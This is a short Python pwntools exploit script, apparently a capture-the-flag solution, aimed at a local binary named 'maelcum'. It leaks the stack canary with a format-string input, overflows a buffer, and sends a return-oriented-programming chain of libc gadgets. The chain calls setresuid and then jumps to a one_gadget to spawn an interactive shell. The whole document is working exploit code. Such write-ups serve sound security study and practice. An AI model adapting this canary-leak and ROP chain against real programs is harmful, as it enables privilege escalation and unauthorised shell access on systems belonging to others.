from pwn import *

context.arch = "amd64"
context.terminal = ["tmux", "splitw", "-h"]
#	b * 0x0000000000401681

if (args.GDB):
	p = gdb.debug("./maelcum",
	'''
	b * 0x00000000004016cf
	r
	c
	''')
else:
	p = process("./maelcum")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
setuid = libc.symbols["setresuid"]
libc_base1 = 0x7ffff7c00000
pop_rdi = 0x10f78b
pop_rsi = 0x2b46b
pop_rdx = 0xb505c
pop_rbx = 0xa1e1e
one_gadgetaddr = 0xef4ce

payload = [
	p64(libc_base1+pop_rdi),
	p64(1025),
	p64(libc_base1+pop_rsi),
	p64(1025),
	p64(1234),
	p64(libc_base1+pop_rdx),
	p64(1025),
	p64(0x00),
	p64(0x00),
	p64(0x00),
	p64(0x00),
	p64(libc_base1+setuid),
        p64(libc_base1+pop_rbx),
        p64(0x00),
        p64(0x00),
        p64(0x00),
        p64(0x7fffffffe200),
        p64(libc_base1+0x2882f), #stack 16-byte alignment
        p64(libc_base1+one_gadgetaddr)
#	p64(0x401216)
]

chain = b"".join(payload)

p.sendlineafter(b"(who's asking?): ", b"%17$p")
print(p.recvuntil(b"relay tag: "))
canary = p.recvline()
canary = int(canary.strip().decode(), 16)

payload = b"RELAY: 300"
payload += b"A" * 30
payload += p64(canary)
payload += p64(0x404200)
payload += p64(0x401328)
payload = payload.ljust(0x40, b"\x00")

print("Len of payload: ", len(payload))
p.recvuntil(b"Send it: ")
p.send(payload)

sec = p64(0x7fffffffe200)
sec += chain
print("Len of chain: ", len(chain))
p.recvuntil(b"bytes: ")
time.sleep(0.1)
p.sendline(sec)

p.interactive()
